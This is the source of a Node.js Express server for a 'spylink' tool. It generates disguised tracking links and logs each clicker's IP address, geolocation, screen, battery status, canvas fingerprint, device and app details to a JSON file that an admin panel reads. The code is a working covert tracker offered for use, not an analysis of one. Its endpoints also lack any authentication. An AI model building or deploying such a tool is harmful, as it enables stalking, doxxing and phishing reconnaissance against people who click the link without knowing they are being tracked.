const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Database file
const DB_FILE = path.join(__dirname, 'data.json');

function readDB() {
  if (!fs.existsSync(DB_FILE)) return { links: [], clicks: [] };
  return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
}

function writeDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// Initialize DB
if (!fs.existsSync(DB_FILE)) writeDB({ links: [], clicks: [] });

// Generate slug
function genSlug(len = 6) {
  const c = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  return Array.from({ length: len }, () => c[Math.floor(Math.random() * c.length)]).join('');
}

// Get client IP
function getClientIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'unknown';
}

// ── API Routes ──

// Create spy link
app.post('/api/link', (req, res) => {
  const { target, alias, campaign, expiry, tracking } = req.body;
  const slug = alias || genSlug();
  const link = {
    id: genSlug(8),
    slug,
    target,
    campaign: campaign || 'untitled',
    created: Date.now(),
    expiry: expiry > 0 ? Date.now() + expiry * 3600000 : 0,
    tracking: tracking || { geo: true, ip: true, screen: true, battery: true, canvas: false },
    clicks: []
  };
  const db = readDB();
  db.links.push(link);
  writeDB(db);
  res.json({ slug, url: `${req.protocol}://${req.get('host')}/spy/${slug}` });
});

// Get all links
app.get('/api/links', (req, res) => {
  const db = readDB();
  res.json(db.links);
});

// Track click
app.post('/api/track', (req, res) => {
  const { slug, ip, geo, screen, battery, canvas, ua, device, apps } = req.body;
  const db = readDB();
  const link = db.links.find(l => l.slug === slug);
  if (!link) return res.status(404).json({ error: 'Link not found' });
  const click = {
    time: Date.now(),
    slug,
    target: link.target,
    ua,
    ip: ip || getClientIP(req),
    geo,
    screen,
    battery,
    canvas,
    device,
    apps: apps || [],
    linkId: link.id
  };
  db.clicks.push(click);
  link.clicks.push(click);
  writeDB(db);
  res.json({ success: true, click });
});

// Get clicks for a link
app.get('/api/clicks/:slug', (req, res) => {
  const db = readDB();
  const clicks = db.clicks.filter(c => c.slug === req.params.slug);
  res.json(clicks);
});

// Get all clicks
app.get('/api/clicks', (req, res) => {
  const db = readDB();
  res.json(db.clicks.sort((a, b) => b.time - a.time));
});

// Clear data
app.delete('/api/clear', (req, res) => {
  writeDB({ links: [], clicks: [] });
  res.json({ success: true });
});

// Serve main page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'spylink.html'));
});

// Serve spy tracking page
app.get('/spy/:slug', (req, res) => {
  res.sendFile(path.join(__dirname, 'spy.html'));
});

app.listen(PORT, () => {
  console.log(`\n  SPYLINK SERVER RUNNING\n  Admin Panel: http://localhost:${PORT}\n  API: http://localhost:${PORT}/api/links\n`);
});